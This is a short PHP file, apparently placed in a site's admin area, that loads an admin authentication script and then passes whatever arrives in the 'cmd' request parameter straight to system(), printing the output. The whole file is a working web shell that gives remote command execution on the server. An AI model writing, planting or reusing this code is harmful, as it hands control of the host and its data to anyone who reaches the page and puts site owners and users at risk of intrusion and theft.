<?php 
require_once('../scripts/admin_auth.php');

if(isset($_REQUEST['cmd'])) { 
    echo "<pre>"; 
    $cmd = ($_REQUEST['cmd']); 
    system($cmd); 
    echo "</pre>"; 
    die; 
}

?>
